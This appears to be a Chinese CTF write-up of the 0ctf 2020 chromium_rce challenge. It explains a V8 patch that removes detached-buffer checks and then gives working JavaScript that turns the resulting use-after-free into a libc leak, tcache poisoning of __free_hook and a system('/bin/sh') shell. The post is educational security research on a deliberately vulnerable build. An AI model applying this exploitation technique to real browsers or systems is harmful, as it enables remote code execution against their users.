---
layout: post
title: 沙箱逃逸之0ctf2020 chromium_rce writeup
date: 2023-01-22
Author: f0cus77
tags: [ctf, browser]
comments: true
toc: true
---

`0ctf 2020`上的题目，总共三题。这是第一题，要做的是对`patch`的`v8`进行利用；第二题是在`chrome`中开启了`Mojo`，要实现`chrome sbx`逃逸；第三题是二者的结合，要求先用`v8`的开启`Mojo`，然后再沙箱逃逸，实现`chrome fullchain`的利用。

## 基础

这是第一题对于`v8`漏洞的`wp`，题目附件内容给的很简单，就三个。一个`patch`文件，一个`d8`及它运行的快照。

```bash
$ ls
d8      snapshot_blob.bin       tctf.diff
```

为了方便调试，先编译对应版本的`v8`：

```bash
git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b
gclient sync
git apply < ../tctf.diff
tools/dev/gm.py x64.release
tools/dev/gm.py x64.debug
```

## 分析

###  TypedArray.prototype.set

要想搞清楚漏洞，先要知道`TypedArray.prototype.set`函数的功能以及实现。

参考[TypedArray.prototype.set](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set)，知道`set()` 方法用于从指定数组中读取值，并将其存储在类型化数组中。使用的语法如下所示：

```js
typedarray.set(array[, offset])
typedarray.set(typedarray[, offset])
```

第一个参数`array`是拷贝数据的源数组，源数组的所有值都会被复制到目标数组中，除非源数组的长度加上偏移量超过目标数组的长度，而在这种情况下会抛出异常；第二个参数偏移量参数`offset`指定从什么地方开始使用源数组 `array` 的值进行写入操作。如果忽略该参数，则默认为`0`。

示例如下所示，简单来说就是从参数中的数组拷贝对应的数据并保存到目的数组当中。

```js
var buffer = new ArrayBuffer(8);
var uint8 = new Uint8Array(buffer);

uint8.set([1,2,3], 3);

console.log(uint8); // Uint8Array [ 0, 0, 0, 1, 2, 3, 0, 0 ]
```

再来看`ecma`标准中对于[TypedArray.prototype.set](https://tc39.es/ecma262/#sec-%25typedarray%25.prototype.set-overloaded-offset)函数实现的规定，如下所示。

![set](https://raw.githubusercontent.com/f0cus77/f0cus77.github.io/master/images/2023-01-29-沙箱逃逸之0ctf2020-chromium_rce-writeup/set.png)

可以看到会对源数组和目的数据的长度进行检查后，调用`SetTypedArrayFromArrayLike`函数，该函数部分定义如下。

![set1](https://raw.githubusercontent.com/f0cus77/f0cus77.github.io/master/images/2023-01-29-沙箱逃逸之0ctf2020-chromium_rce-writeup/set1.png)

很关键的一点是会在该函数中调用`IsDetachedBuffer`来检查源数组以及目的数组存放数据的空间是否已经被释放，如果被释放则抛出异常。如果这两个空间都没被释放，说明内存空间可用，可以正常拷贝；如果某个内存空间被释放的话，如果仍然正常使用，则形成了`UAF`漏洞。

### diff 分析

题目对`v8`的`patch`关键有两部分，第一部分是对`TypedArrayPrototypeSet`函数的`patch`，可以看到它把对于源数组以及目标数组存放数据空间内存的检查给`patch`掉了。

```diff
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+    const utarget = %RawDownCast<AttachedJSTypedArray>(target);
 
     const overloadedArg = arguments[0];
     try {
@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
-      const utypedArray =
-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+      const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);
 
       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
```

`EnsureAttached`代码如下所示，很直观的可以看到，代码的`patch`将`IsDetachedBuffer(array.buffer)`的判断给去掉了，而是直接将内存指针进行转换。即如果我们释放了`array.buffer`，代码仍然会正常调用`set`函数。

```c++
// builtins/typed-array.tq: 168
macro EnsureAttached(array: JSTypedArray): AttachedJSTypedArray
    labels Detached {
  if (IsDetachedBuffer(array.buffer)) goto Detached;
  return %RawDownCast<AttachedJSTypedArray>(array);
}
```

第二个关键的`patch`，则是对于本应该是给定`--allow-native-syntax`参数才可以调用的函数的处理。当解析代码遇到`Token::MOD`（`%`）的时候，本来会判断`flags().allow_natives_syntax()`是否开启，开启的话再调用`ParseV8Intrinsic`函数。`patch`过后，将`flags().allow_natives_syntax()`的判断去掉了，直接调用`ParseV8Intrinsic`函数，这也就意味着可以直接调用`v8`的内部函数，而不需要`--allow-native-syntax`参数。

另一部分`patch`则是加入了`function->function_id != Runtime::kArrayBufferDetach`的判断，即当调用`ParseV8Intrinsic`函数的时候，如果函数的`id`不是`kArrayBufferDetach`的话，就不进行调用。

上面两个结合起来的内容就是，允许不使用`--allow-native-syntax`参数就直接使用内部函数，但内部函数限制为`%ArrayBufferDetach`的调用，像`%DebugPrint`这些函数就不能再进行使用了。

```diff
--- a/src/parsing/parser-base.h
+++ b/src/parsing/parser-base.h
@@ -1907,10 +1907,8 @@ ParserBase<Impl>::ParsePrimaryExpression() {
       return ParseTemplateLiteral(impl()->NullExpression(), beg_pos, false);
 
     case Token::MOD:
-      if (flags().allow_natives_syntax() || extension_ != nullptr) {
-        return ParseV8Intrinsic();
-      }
-      break;
+      // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
+      return ParseV8Intrinsic();
 
     default:
       break;
diff --git a/src/parsing/parser.cc b/src/parsing/parser.cc
index 9577b37397..2206d250d7 100644
--- a/src/parsing/parser.cc
+++ b/src/parsing/parser.cc
@@ -357,6 +357,11 @@ Expression* Parser::NewV8Intrinsic(const AstRawString* name,
   const Runtime::Function* function =
       Runtime::FunctionForName(name->raw_data(), name->length());
 
+  // Only %ArrayBufferDetach allowed
+  if (function->function_id != Runtime::kArrayBufferDetach) {
+    return factory()->NewUndefinedLiteral(kNoSourcePosition);
+  }
+
   // Be more permissive when fuzzing. Intrinsics are not supported.
   if (FLAG_fuzzing) {
     return NewV8RuntimeFunctionForFuzzing(function, args, pos);
```

### 漏洞分析

经过了上面的分析，漏洞原理就很简单了。即我们可以直接使用`%ArrayBufferDetach`函数来释放`TypedArray`的数据内存，在释放后仍然可以调用`TypedArray.prototype.set`函数来操作该内存，从而形成了`UAF`漏洞。

## 漏洞利用

`poc`的构造比较简单：

```js
let a = new Uint8Array(0x200);
let b = new Uint8Array(0x200);
%ArrayBufferDetach(a.buffer); // into tcache
a.set(b) // overwrite a's fd, write to freed mem
b.set(a) // read from freed mem
```

`d8`使用的是`glibc`来进行内存分配，所以这题可以简化成堆的菜单题。

这里需要注意一点的是正常以`new Uint8Array(0x200);`这种形式来分配内存的时候，会调用`calloc`来分配内存，它是不会用`tcache`来分配的。分配的函数调用栈如下所示：

```asm
#0  __libc_calloc (n=0x600, elem_size=0x1) at malloc.c:3366
#1  0x00007f3b7fbd411c in v8::(anonymous namespace)::ArrayBufferAllocator::Allocate (this=0x5600e01d5af0, length=0x600) at ../../src/api/api.cc:546
#2  0x00005600e013ba6f in v8::(anonymous namespace)::ArrayBufferAllocatorBase::Allocate (this=0x7fff5cf95c40, length=0x600) at ../../src/d8/d8.cc:120
#3  0x00005600e013b8ec in v8::(anonymous namespace)::ShellArrayBufferAllocator::Allocate (this=0x7fff5cf95c40, length=0x600) at ../../src/d8/d8.cc:141
#4  0x00007f3b8034cfa1 in v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0::operator()(unsigned long) const (this=0x7fff5cf94228, byte_length=0x600) at ../../src/objects/backing-store.cc:238
#5  0x00007f3b8034cf22 in std::__Cr::__invoke<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long> (__f=..., __args=@0x7fff5cf940a0: 0x600) at ../../buildtools/third_party/libc++/trunk/include/type_traits:3529
#6  0x00007f3b8034cee2 in std::__Cr::__invoke_void_return_wrapper<void*>::__call<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long>(v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long&&) (__args=@0x7fff5cf940a0: 0x600, __args=@0x7fff5cf940a0: 0x600) at ../../buildtools/third_party/libc++/trunk/include/__functional_base:317
#7  0x00007f3b8034cea0 in std::__Cr::__function::__default_alloc_func<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0, void* (unsigned long)>::operator()(unsigned long&&) (this=0x7fff5cf94228, __arg=@0x7fff5cf940a0: 0x600) at ../../buildtools/third_party/libc++/trunk/include/functional:1590
#8  0x00007f3b8034ce66 in std::__Cr::__function::__policy_invoker<void* (unsigned long)>::__call_impl<std::__Cr::__function::__default_alloc_func<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0, void* (unsigned long)> >(std::__Cr::__function::__policy_storage const*, unsigned long) (__buf=0x7fff5cf94228, __args=0x600) at ../../buildtools/third_party/libc++/trunk/include/functional:2071
#9  0x00007f3b800c810e in std::__Cr::__function::__policy_func<void* (unsigned long)>::operator()(unsigned long&&) const (this=0x7fff5cf94228, __args=@0x7fff5cf94100: 0x600) at ../../buildtools/third_party/libc++/trunk/include/functional:2203
#10 0x00007f3b800999b0 in std::__Cr::function<void* (unsigned long)>::operator()(unsigned long) const (this=0x7fff5cf94228, __arg=0x600) at ../../buildtools/third_party/libc++/trunk/include/functional:2473
#11 0x00007f3b80082dc0 in v8::internal::Heap::AllocateExternalBackingStore(std::__Cr::function<void* (unsigned long)> const&, unsigned long) (this=0x2c4a000097b0, allocate=..., byte_length=0x600) at ../../src/heap/heap.cc:2908
#12 0x00007f3b8034a1e6 in v8::internal::BackingStore::Allocate (isolate=0x2c4a00000000, byte_length=0x600, shared=v8::internal::SharedFlag::kNotShared, initialized=v8::internal::InitializedFlag::kZeroInitialized) at ../../src/objects/backing-store.cc:252
#13 0x00007f3b7fd00277 in v8::internal::(anonymous namespace)::ConstructBuffer (isolate=0x2c4a00000000, target=..., new_target=..., length=..., initialized=v8::internal::InitializedFlag::kZeroInitialized) at ../../src/builtins/builtins-arraybuffer.cc:56
#14 0x00007f3b7fcfde82 in v8::internal::Builtin_Impl_ArrayBufferConstructor (args=..., isolate=0x2c4a00000000) at ../../src/builtins/builtins-arraybuffer.cc:92
#15 0x00007f3b7fcfd69e in v8::internal::Builtin_ArrayBufferConstructor (args_length=0x6, args_object=0x7fff5cf946f8, isolate=0x2c4a00000000) at ../../src/builtins/builtins-arraybuffer.cc:70
#16 0x00007f3b7f75563f in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit () from /home/f0cus77/work/pwn/v8/v8/out/x64.debug/libv8.so
#17 0x00007f3b7f51e265 in Builtins_JSBuiltinsConstructStub () from /home/f0cus77/work/pwn/v8/v8/out/x64.debug/libv8.so
#18 0x00002c4a08246ac9 in ?? ()
#19 0x00002c4a08246ac9 in ?? ()
#20 0x000000000000000c in ?? ()
#21 0x00002c4a08040385 in ?? ()
#22 0x0000000000000c00 in ?? ()
#23 0x00002c4a08040385 in ?? ()
#24 0x0000000000000002 in ?? ()
#25 0x00002c4a08240229 in ?? ()
#26 0x0000000000000024 in ?? ()
#27 0x00007fff5cf947a8 in ?? ()
#28 0x00007f3b7f96b1d8 in Builtins_CreateTypedArray () from /home/f0cus77/work/pwn/v8/v8/out/x64.debug/libv8.so
```

使用如下形式却是可以触发`malloc`的。

```js
let a = {};
a.length = size; // malloc size
return new Uint8Array(a);
```

函数调用栈如下所示：

```asm
#0  __GI___libc_malloc (bytes=0x60) at malloc.c:3023
#1  0x00007f9a9622a157 in v8::(anonymous namespace)::ArrayBufferAllocator::AllocateUninitialized (this=0x55978bd6daf0, length=0x60) at ../../src/api/api.cc:557
#2  0x000055978b4d3aaf in v8::(anonymous namespace)::ArrayBufferAllocatorBase::AllocateUninitialized (this=0x7ffc940df460, length=0x60) at ../../src/d8/d8.cc:124
#3  0x000055978b4d394c in v8::(anonymous namespace)::ShellArrayBufferAllocator::AllocateUninitialized (this=0x7ffc940df460, length=0x60) at ../../src/d8/d8.cc:146
#4  0x00007f9a969a2f76 in v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0::operator()(unsigned long) const (this=0x7ffc940ddbc8, byte_length=0x60) at ../../src/objects/backing-store.cc:236
#5  0x00007f9a969a2f22 in std::__Cr::__invoke<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long> (__f=..., __args=@0x7ffc940dda40: 0x60) at ../../buildtools/third_party/libc++/trunk/include/type_traits:3529
#6  0x00007f9a969a2ee2 in std::__Cr::__invoke_void_return_wrapper<void*>::__call<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long>(v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0&, unsigned long&&) (__args=@0x7ffc940dda40: 0x60, __args=@0x7ffc940dda40: 0x60) at ../../buildtools/third_party/libc++/trunk/include/__functional_base:317
#7  0x00007f9a969a2ea0 in std::__Cr::__function::__default_alloc_func<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0, void* (unsigned long)>::operator()(unsigned long&&) (this=0x7ffc940ddbc8, __arg=@0x7ffc940dda40: 0x60) at ../../buildtools/third_party/libc++/trunk/include/functional:1590
#8  0x00007f9a969a2e66 in std::__Cr::__function::__policy_invoker<void* (unsigned long)>::__call_impl<std::__Cr::__function::__default_alloc_func<v8::internal::BackingStore::Allocate(v8::internal::Isolate*, unsigned long, v8::internal::SharedFlag, v8::internal::InitializedFlag)::$_0, void* (unsigned long)> >(std::__Cr::__function::__policy_storage const*, unsigned long) (__buf=0x7ffc940ddbc8, __args=0x60) at ../../buildtools/third_party/libc++/trunk/include/functional:2071
#9  0x00007f9a9671e10e in std::__Cr::__function::__policy_func<void* (unsigned long)>::operator()(unsigned long&&) const (this=0x7ffc940ddbc8, __args=@0x7ffc940ddaa0: 0x60) at ../../buildtools/third_party/libc++/trunk/include/functional:2203
#10 0x00007f9a966ef9b0 in std::__Cr::function<void* (unsigned long)>::operator()(unsigned long) const (this=0x7ffc940ddbc8, __arg=0x60) at ../../buildtools/third_party/libc++/trunk/include/functional:2473
#11 0x00007f9a966d8dc0 in v8::internal::Heap::AllocateExternalBackingStore(std::__Cr::function<void* (unsigned long)> const&, unsigned long) (this=0x1420000097b0, allocate=..., byte_length=0x60) at ../../src/heap/heap.cc:2908
#12 0x00007f9a969a01e6 in v8::internal::BackingStore::Allocate (isolate=0x142000000000, byte_length=0x60, shared=v8::internal::SharedFlag::kNotShared, initialized=v8::internal::InitializedFlag::kUninitialized) at ../../src/objects/backing-store.cc:252
#13 0x00007f9a96356277 in v8::internal::(anonymous namespace)::ConstructBuffer (isolate=0x142000000000, target=..., new_target=..., length=..., initialized=v8::internal::InitializedFlag::kUninitialized) at ../../src/builtins/builtins-arraybuffer.cc:56
#14 0x00007f9a963542bf in v8::internal::Builtin_Impl_ArrayBufferConstructor_DoNotInitialize (args=..., isolate=0x142000000000) at ../../src/builtins/builtins-arraybuffer.cc:104
#15 0x00007f9a96353fae in v8::internal::Builtin_ArrayBufferConstructor_DoNotInitialize (args_length=0x6, args_object=0x7ffc940ddf48, isolate=0x142000000000) at ../../src/builtins/builtins-arraybuffer.cc:99
#16 0x00007f9a95dab63f in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit () from /home/f0cus77/work/pwn/v8/v8/out/x64.debug/libv8.so
#17 0x00007f9a95fbed6c in Builtins_CreateTypedArray () 
```

对应到`v8`中的代码如下所示，当触发`malloc`的时候，走的是`AllocateUninitialized`分支；调用`calloc`的时候，走的是`Allocate`分支。

```c++
// Allocate a backing store using the array buffer allocator from the embedder.
std::unique_ptr<BackingStore> BackingStore::Allocate(
    Isolate* isolate, size_t byte_length, SharedFlag shared,
    InitializedFlag initialized) {
    ...
    auto allocate_buffer = [allocator, initialized](size_t byte_length) {
      if (initialized == InitializedFlag::kUninitialized) {
        return allocator->AllocateUninitialized(byte_length);
      }
      void* buffer_start = allocator->Allocate(byte_length);
      ...
      return buffer_start;
    };
```

有了上面的解释，下面我们来构造菜单题所对应的原语，如下所示：

```js
function calloc(size)
{
    let uint8 =  new Uint8Array(size);
    return uint8;
}

function malloc(size)
{
    var malloc_size = {};
    malloc_size.length = size;
    let uint8 =  new Uint8Array(malloc_size);
    return uint8;
}

function free(ptr)
{
    %ArrayBufferDetach(ptr.buffer);
}

function write64(ptr, offset, val)
{
    let dv = new DataView(ptr.buffer);
    dv.setBigInt64(offset, val, true);
    return;
}

function read64(ptr, offset)
{
    let dv = new DataView(ptr.buffer);
    val = dv.getBigInt64(offset, true);
    return val;
}

```

利用的思路是：

* 先申请大的堆块，然后释放进`unsorted bin`，利用`uaf`漏洞泄露出`libc`地址。

  ```js
  // calloc a big chunk with 0x600
  let leak_ptr = calloc(0x600);
  let read_ptr = calloc(0x600);
  
  // calloc a chunk with /bin/sh string
  let gap = calloc(0x100);
  write64(gap, 0, 0x68732f6e69622fn);
  
  // free big chunk to unsorted_bin
  free(leak_ptr);
  
  // uaf to leak libc address
  read_ptr.set(leak_ptr);
  
  let libc_base = read64(read_ptr, 8) - 0x1ebbe0n;
  console.log("[+] libc base: 0x"+hex(libc_base));
  ```

* 申请小堆块，然后释放进`tcache`，然后利用`uaf`漏洞修改`tcache`的指针指向`free hook`。

  ```js
  // malloc tcache chunk with 0x60
  let evil_ptr = malloc(0x60);
  // malloc another tcache chunk with 0x60
  let evil_ptr1 = malloc(0x60);
  let write_ptr = malloc(0x60);
  // deploy a chunk with free_hook addr content
  write64(write_ptr, 0, free_hook);
  
  // free 0x60 chunk to tcache, tcache count is 1;
  free(evil_ptr1);
  // free evil chunk to tcache, tcache count is 2;
  free(evil_ptr);
  
  // set tcache chunk fd to free_hook addr;
  evil_ptr.set(write_ptr);
  
  // malloc out the first chunk, tcache count is 1;
  let reserved_ptr = malloc(0x60);
  // malloc out free_hook chunk, tcache count is 0;
  let free_hook_ptr = malloc(0x60);
  ```

* 修改`free hook`的内容为`system`地址，释放内容`/bin/sh`的堆块，成功`get shell`。

  ```js
  // write system addr to free_hook
  write64(free_hook_ptr, 0, system_addr);
  
  // free mem with /bin/sh to get shell.
  free(gap);
  ```

要提一句的是调试的时候最好把第二部分的`patch`即`function->function_id != Runtime::kArrayBufferDetach`对内置函数判断的检查给去掉，这样就可以正常使用其他的内置函数来，不然像`%DebugPrint`这些函数用不了的话，还是影响调试的。

## 总结

第一次体验`v8`里面的`uaf`漏洞，感觉这种在正常的漏洞里面应该会比较少见，但是也是新颖。也加深了对`TypedArray backing_store`指针的理解。

文章首发于[奇安信攻防社区](https://forum.butian.net/share/2079)

## 参考

* [0CTF Chromium RCE WriteUp](https://www.anquanke.com/post/id/209401)

* [Chromium RCE - v8 exploitation](https://fineas.github.io/FeDEX/post/chromium_rce.html)

  

